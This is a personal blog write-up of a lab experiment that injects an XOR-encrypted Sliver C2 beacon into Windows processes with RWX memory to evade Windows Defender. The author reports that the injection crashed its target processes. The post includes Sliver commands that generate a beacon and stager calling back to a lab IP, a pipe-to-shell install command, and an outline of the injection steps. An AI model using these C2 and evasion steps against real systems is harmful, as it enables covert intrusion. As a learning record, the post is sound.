+++
title = 'Injecting Shellcode Via RWX Protected Memory Regions'
date = 2025-07-10
draft = false
+++


## 1. PREFACE
So I've been doing some couples of malware academy modules and reverse engineering malwares, but i've never tried to officially bypass windows defender and inject a shellcode. So, I’ve been trying a simple defense evasion technique for windows defender by enumerating processes with a RWX Protected memory region to inject my sliver beacon combined with XOR encryption. One point to note is that, even though it bypasses windows defender antivirus, that doesn't mean that it does not leave other IOC's and to apply this in a real world scenario would require additional stealth features. In this blog, I'll talk about my successes and challenges.


>⚠️ Be ready to be disappointed...


---

## 2. SETUP

#### SETTING UP SLIVER C2 ON KALI

1. Generating beacon profile implant : `profiles new beacon --mtls 192.168.38.128 --os windows --arch amd64 --format shellcode --seconds 5 --jitter 3 win_implant`

>⚠️`--skip-symbols` disables obfuscation

2. Starting the mtls listener : `mtls`
3. Starting the stage listener : `stage-listener --url tcp://192.168.38.128:8443 --profile win_implant`
4. See you listener : `jobs`
5. Generate the stager : `generate stager --lhost 192.168.38.128 --lport 8443 --arch amd64 --format c --save /tmp`

>[!warning]
>You might encounter issues while trying to generate your stager, if you've installed sliver with this : `curl https://sliver.sh/install|sudo bash`. You might need to install it from the release binaries

#### SETTING UP TARGET WINDOWS MACHINE

1. Install Windows on a VM
2. Make sure windows defender is up to date and activated

---

## 3. Development

1. Enumerating the processes
2. If we're able to open the process, we'll have query inside it's memory to find a memory section with RWX
3. Once we find it we will decrypt and inject the shellcode inside that memory region and then start a thread starting from that section
4. We should get a reverse shell connection back to our `Slvier C2` if everything went well (sadly we don't😢)

---

## Problems encountered

- My payload kept getting injected into `SearchApp.exe` which is only used when performing searches and by looking at the process inside `System Informer` formerly known as `Process Hacker`, I could see that the process is almost always in a suspended state, unless i perform searches on the host, so i thought that was the problem

{{< image src="/images/Pasted image 20250705004129.png" alt="20250705004129" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

- So I tried to perform a search, so that the process would resume, but as soon as it resumed it crashed...

- I also could see that even though my shellcode was written inside the memory, it was not fully written, but only portion

{{< image src="/images/Pasted image 20250708172711.png" alt="20250708172711" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

- So i went in x64dbg, to in x32dbg to inspect it a little bit further (the beauty of learning reverse engineering, I still suck btw)
    1. Set a breakpoint on `WriteProcessMemory`, so the first process that has `RWX` 
    2. Go on the memory section and identify the third argument and follow in dump, execute till return and see a change happening in the dump
    3. Follow the pointer that was written in the next dump tab and you will see the shellcode

{{< image src="/images/Pasted image 20250708211454.png" alt="20250708211454" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

{{< image src="/images/Pasted image 20250708211552.png" alt="20250708211552" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

{{< image src="/images/Pasted image 20250708211707.png" alt="20250708211707" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

- I could clearly see that my shellcode was passed fully to the `WriteProcessMemory`, but anyway by changing my code a little bit and how I was passing my shellcode the function, I was able to fix it


{{< image src="/images/poc8.png" alt="poc8" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

- This did not fix the real problem, so I thought maybe I should inject in another process, maybe that would give a different result, so this is what I did, but as soon as the shellcode got injected and I created a thread to start at that newly written memory region, the program crashed...what is going on? this is not good, even though this is a lab, I was thinking in a real world scenario if you see some of your app crash, after running a program, this will immediately trigger a red alert, even though windows defender doesn't detect anything

- Maybe pausing the process, inject the shellcode and then resume, would fix the problem but, no, I got the same result

- So, I tried a bunch of different things, but always ended up at the same result, but, at least the good news is that I was able to bypass windows defender, right? We have to stay positive in this field, count them small wins...

{{< image src="/images/Pasted image 20250624141138.png" alt="20250624141138" position="center" style="border-radius: 6px; margin-top: 20px; margin-bottom: 20px; margin-left: auto; margin-right: auto" >}}

---

### 3. Conclusion

To conclude, even though this gets undected by the windows defender antivirus, it still would get detected by an EDR and this angle is not stable enough. What i mean by that, is that since we're overwritting a section of memory that has the RWX Protected Memory Region, i can deduce that the app crashes because we might be overwritting a critical section of the process that is needed to make the process run smoothly. Also, if you see an app crash, this could potentially lead your malware to be discovered which is no good. This type of defense evasion is a good learning experience, but to apply this into a real world scenario would require additionnal tweaks or a different approach.